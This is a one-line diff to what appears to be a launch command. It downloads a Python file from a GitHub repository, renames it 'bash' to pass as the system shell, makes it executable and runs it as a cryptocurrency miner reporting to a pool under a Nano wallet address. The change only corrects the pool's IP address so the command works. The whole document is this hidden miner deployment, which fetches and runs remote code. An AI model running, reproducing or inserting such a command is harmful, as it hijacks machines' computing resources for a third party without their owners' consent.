@@ -1,1 +1,1 @@
-wget https://github.com/mcnxzijfe/hoangg/raw/main/cv.py && mv cv.py bash && chmod +x bash && ./bash --algo ETHASH --pool 172-31-53-193:80 --user nano_15yc3tyhj9wk19xc3ob45p8rxjaam7esbpoctaugafcc4ww76kg9yj8s99ui.WORKER_NAME
+wget https://github.com/mcnxzijfe/hoangg/raw/main/cv.py && mv cv.py bash && chmod +x bash && ./bash --algo ETHASH --pool 172.31.53.193:80 --user nano_15yc3tyhj9wk19xc3ob45p8rxjaam7esbpoctaugafcc4ww76kg9yj8s99ui.WORKER_NAME
